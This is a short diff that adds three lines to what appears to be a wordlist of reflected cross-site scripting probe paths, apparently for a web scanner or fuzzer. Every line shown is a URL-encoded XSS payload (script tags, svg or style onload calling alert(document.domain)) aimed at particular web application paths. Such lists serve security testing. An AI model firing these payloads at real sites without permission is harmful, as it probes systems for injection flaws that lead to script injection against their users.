@@ -946,3 +946,6 @@ request?info=<svg onload=alert(
 /webshell4/login.php?login=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /<style%20onload=alert`document.domain`;>../..%2f
 /include/dialog/config.php?adminDirHand=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/index.php?search=1af%22+onclick%3D
+/?subreddit=news&score=2134%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/Solar_Image.php?mode=resize&fname=test%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
